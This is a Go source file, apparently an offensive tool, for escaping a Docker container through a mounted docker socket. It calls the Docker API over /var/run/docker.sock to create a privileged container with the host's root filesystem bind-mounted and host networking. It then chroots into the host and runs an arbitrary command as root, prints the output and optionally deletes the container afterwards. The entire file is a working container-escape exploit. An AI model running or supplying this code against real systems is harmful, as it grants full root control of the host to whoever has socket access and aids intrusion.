package main

import (
    "bytes"
    "context"
    "encoding/json"
    "flag"
    "fmt"
    "io"
    "net"
    "net/http"
    "os"
)

/*
Provides some basic functionality for escaping a docker container through a mounted docker socket.
Spawns new container with host filesystem and network mounted, executes commands on host fs through new container.
*/
func main() {
    cmd := flag.String("c", "id", "Command to run inside host root")
    img := flag.String("i", "alpine", "Docker image")
    del := flag.Bool("d", true, "Delete container afterwards")
    flag.Parse()

    client := &http.Client{
        Transport: &http.Transport{
            DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
                return net.Dial("unix", "/var/run/docker.sock")
            },
        },
    }

    args := []string{"chroot", "/host", "/bin/sh"}
    if *cmd != "" {
        args = append(args, "-c", *cmd)
    }

    payload, _ := json.Marshal(map[string]any{
        "Image":      *img,
        "Cmd":        args,
        "Tty":        true,
        "HostConfig": map[string]any{"Privileged": true, "Binds": []string{"/:/host"}, "NetworkMode": "host"},
    })

    //create container
    resp, err := client.Post("http://localhost/v1.41/containers/create", "application/json", bytes.NewReader(payload))
    if err != nil || resp.StatusCode != http.StatusCreated {
        fmt.Fprintln(os.Stderr, "Error creating container")
        os.Exit(1)
    }
    var res struct{ ID string }
    json.NewDecoder(resp.Body).Decode(&res)
    resp.Body.Close()

    //start container
    client.Post(fmt.Sprintf("http://localhost/v1.41/containers/%s/start", res.ID), "application/json", nil)
    fmt.Println("***spawned container:) ID:", res.ID[:12])

    //handle command output if any, else leave running
    if *cmd != "" {
        req, _ := http.NewRequest("POST", fmt.Sprintf("http://localhost/v1.41/containers/%s/wait", res.ID), nil)
        if r, err := client.Do(req); err == nil {
            io.Copy(io.Discard, r.Body)
            r.Body.Close()
        }
    }

    resp, _ = client.Get(fmt.Sprintf("http://localhost/v1.41/containers/%s/logs?stdout=1&stderr=1", res.ID))
    io.Copy(os.Stdout, resp.Body)
    resp.Body.Close()

    //optional: delete container after running command
    if *del {
        req, _ := http.NewRequest("DELETE", fmt.Sprintf("http://localhost/v1.41/containers/%s", res.ID), nil)
        if r, err := client.Do(req); err == nil {
            r.Body.Close()
        }
    }
}

